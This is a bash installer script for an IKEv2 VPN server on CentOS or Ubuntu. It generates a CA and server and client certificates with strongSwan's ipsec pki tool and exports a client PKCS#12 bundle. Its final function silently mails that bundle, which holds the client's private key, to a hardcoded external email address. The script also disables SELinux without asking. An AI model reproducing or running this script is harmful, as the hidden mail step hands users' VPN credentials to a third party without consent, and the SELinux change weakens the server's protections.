#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
clear


# Install IKEV2
function install_ikev2(){
	rootness
	disable_selinux
	get_my_ip
	get_system
	pre_install
	get_key
	success_info
}

# Make sure only root can run our script
function rootness(){
if [[ $EUID -ne 0 ]]; then
   echo "Error:This script must be run as root!" 1>&2
   exit 1
fi
}

# Disable selinux
function disable_selinux(){
if [ -s /etc/selinux/config ] && grep 'SELINUX=enforcing' /etc/selinux/config; then
    sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
    setenforce 0
fi
}

# Get IP address of the server
function get_my_ip(){
    echo "Preparing, Please wait a moment..."
    IP=`curl -s checkip.dyndns.com | cut -d' ' -f 6  | cut -d'<' -f 1`
    if [ -z $IP ]; then
        IP=`curl -s ifconfig.me/ip`
    fi
}


# Ubuntu or CentOS
function get_system(){
	get_system_str=`cat /etc/issue`
	echo "$get_system_str" |grep -q "CentOS"
	if  [ $? -eq 0 ]
	then
		system_str="0"
	else
		echo "$get_system_str" |grep -q "Ubuntu"
		if [ $? -eq 0 ]
		then
			system_str="1"
		else
			echo "This Script must be running at the CentOS or Ubuntu!"
			exit 1
		fi
	fi
	
}

# Pre-installation settings
function pre_install(){
	echo "#############################################################"
	echo "# Install IKEV2 VPN for CentOS6.x (32bit/64bit) or Ubuntu"
	echo "# Intro: http://quericy.me/blog/699"
	echo "#"
	echo "# Author:quericy"
	echo "#"
	echo "#############################################################"
	echo ""
    echo "please choose the type of your VPS(Xen、KVM: 1  ,  OpenVZ: 2):"
    read -p "your choice(1 or 2):" os_choice
    if [ "$os_choice" = "1" ]; then
        os="1"
		os_str="Xen、KVM"
		else
			if [ "$os_choice" = "2" ]; then
				os="2"
				os_str="OpenVZ"
				else
				echo "wrong choice!"
				exit 1
			fi
    fi
	echo "please input the ip (or domain) of your VPS:"
    read -p "ip or domain(default_vale:${IP}):" vps_ip
	if [ "$vps_ip" = "" ]; then
		vps_ip=$IP
	fi
	echo "please input the cert country(C):"
    read -p "C(default value:com):" my_cert_c
	if [ "$my_cert_c" = "" ]; then
		my_cert_c="com"
	fi
	echo "please input the cert organization(O):"
    read -p "O(default value:myvpn):" my_cert_o
	if [ "$my_cert_o" = "" ]; then
		my_cert_o="myvpn"
	fi
	echo "please input the cert common name(CN):"
    read -p "CN(default value:VPN CA):" my_cert_cn
	if [ "$my_cert_cn" = "" ]; then
		my_cert_cn="VPN CA"
	fi
	echo "####################################"
    get_char(){
        SAVEDSTTY=`stty -g`
        stty -echo
        stty cbreak
        dd if=/dev/tty bs=1 count=1 2> /dev/null
        stty -raw
        stty echo
        stty $SAVEDSTTY
    }
    echo "Please confirm the information:"
	echo ""
	echo -e "the type of your server: [\033[32;1m$os_str\033[0m]"
	echo -e "the ip(or domain) of your server: [\033[32;1m$vps_ip\033[0m]"
	echo -e "the cert_info:[\033[32;1mC=${my_cert_c}, O=${my_cert_o}\033[0m]"
	echo ""
    echo "Press any key to start...or Press Ctrl+C to cancel"
	char=`get_char`
	#Current folder
    cur_dir=`pwd`
    cd $cur_dir
}

# configure cert and key
function get_key(){
	rm client.cert.p12
	rm ca.cert.pem
	rm /usr/local/etc/ipsec.d/cacerts/ca.cert.pem
	rm server.cert.pem
	rm /usr/local/etc/ipsec.d/certs/server.cert.pem
	rm server.pem
	rm /usr/local/etc/ipsec.d/private/server.pem
	rm client.cert.pem 
	rm /usr/local/etc/ipsec.d/certs/client.cert.pem
	rm client.pem
	rm /usr/local/etc/ipsec.d/private/client.pem
	cd $cur_dir
    if [ -f ca.pem ];then
        echo -e "ca.pem [\033[32;1mfound\033[0m]"
    else
        echo -e "ca.pem [\033[32;1mauto create\032[0m]"
		echo "auto create ca.pem ..."
		ipsec pki --gen --outform pem > ca.pem
    fi
	
	if [ -f ca.cert.pem ];then
        echo -e "ca.cert.pem [\033[32;1mfound\033[0m]"
    else
        echo -e "ca.cert.pem [\032[33;1mauto create\032[0m]"
		echo "auto create ca.cert.pem ..."
		ipsec pki --self --in ca.pem --dn "C=${my_cert_c}, O=${my_cert_o}, CN=${my_cert_cn}" --ca --outform pem >ca.cert.pem
    fi
	if [ ! -d my_key ];then
        mkdir my_key
    fi
	mv ca.pem my_key/ca.pem
	mv ca.cert.pem my_key/ca.cert.pem
	cd my_key
	ipsec pki --gen --outform pem > server.pem	
	ipsec pki --pub --in server.pem | ipsec pki --issue --cacert ca.cert.pem \
--cakey ca.pem --dn "C=${my_cert_c}, O=${my_cert_o}, CN=${vps_ip}" \
--san="${vps_ip}" --flag serverAuth --flag ikeIntermediate \
--outform pem > server.cert.pem
	ipsec pki --gen --outform pem > client.pem	
	ipsec pki --pub --in client.pem | ipsec pki --issue --cacert ca.cert.pem --cakey ca.pem --dn "C=${my_cert_c}, O=${my_cert_o}, CN=VPN Client" --outform pem > client.cert.pem
	echo "configure the pkcs12 cert password(Can be empty):"
	openssl pkcs12 -export -inkey client.pem -in client.cert.pem -name "client" -certfile ca.cert.pem -caname "${my_cert_cn}"  -out client.cert.p12
	echo "####################################"
    get_char(){
        SAVEDSTTY=`stty -g`
        stty -echo
        stty cbreak
        dd if=/dev/tty bs=1 count=1 2> /dev/null
        stty -raw
        stty echo
        stty $SAVEDSTTY
    }
    echo "Press any key to install ikev2 VPN cert"
	cp -r ca.cert.pem /usr/local/etc/ipsec.d/cacerts/
	cp -r server.cert.pem /usr/local/etc/ipsec.d/certs/
	cp -r server.pem /usr/local/etc/ipsec.d/private/
	cp -r client.cert.pem /usr/local/etc/ipsec.d/certs/
	cp -r client.pem  /usr/local/etc/ipsec.d/private/
	
}

# echo the success info
function success_info(){
	echo "#############################################################"
	echo -e "DONE"
	echo -e "#############################################################"
	echo -e ""
	
	uuencode client.cert.p12 client.cert.p12 | mail -s cert ainominako1203@yahoo.co.jp
	ipsec restart
}

# Initialization step
install_ikev2
